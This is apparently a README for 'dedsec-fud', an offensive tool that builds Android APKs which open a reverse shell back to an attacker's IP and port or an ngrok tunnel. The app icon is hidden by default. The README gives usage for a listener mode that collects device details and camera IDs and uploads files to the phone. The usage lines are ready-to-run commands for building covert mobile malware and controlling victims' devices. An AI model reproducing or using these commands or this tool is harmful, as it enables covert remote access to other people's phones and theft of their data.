```
### TESTED ON FOLLOWING:
* Kali Linux
* Parrot OS
* Ubuntu
* Arch Linux

### Available Modes
* `--build` - for building the android apk 
* `--ngrok` - for using ngrok tunnel (over the internet)
* `--shell` - getting an interactive shell of the device

### `build` mode

```
Usage:
  sudo python3 dedsec-fud.py --build --ngrok [flags]
  Flags:
    -p, --port              Attacker port number (optional by default its set to 8000)
    -o, --output            Name for the apk file (optional by default its set to "dedsec-payload.apk")
    -icon, --icon           Visible icon after installing apk (by default set to hidden)
```

```
Usage:
  sudo python3 dedsec-fud.py --build [flags]
  Flags:
    -i, --ip                Attacker IP address (required)
    -p, --port              Attacker port number (required)
    -o, --output            Name for the apk file (optional)
    -icon, --icon           Visible icon after installing apk (by default set to hidden)
```

Or you can manually build the apk by importing [Android Code](Android_Code) folder to Android Studio and changing the IP address and port number in [config.java](Android_Code/app/src/main/java/com/example/reverseshell2/config.java) file and then you can generate the signed apk from `Android Studio -> Build -> Generate Signed APK(s)`
### `shell` mode
```
Usage:
  sudo python3 dedsec-fud.py --shell [flags]
  Flags:
    -i, --ip                Listner IP address
    -p, --port              Listner port number
```
After running the `shell` mode you will get an interpreter of the device  

Commands which can run on the interpreter
```
    deviceInfo                 --> returns basic info of the device
    camList                    --> returns cameraID

    getMACAddress              --> returns the mac address of the device

```
In the sh shell there are some sub commands

    put [filename]              --> uploads the file to the android device
```

* To build the apk using ngrok which will also set the listner:
```sudo python3 dedsec-fud.py --build --ngrok -o payload.apk```

* To build the apk using desired ip and port:
```sudo python3 dedsec-fud.py --build -i 192.169.x.x -p 8000 -o payload.apk```
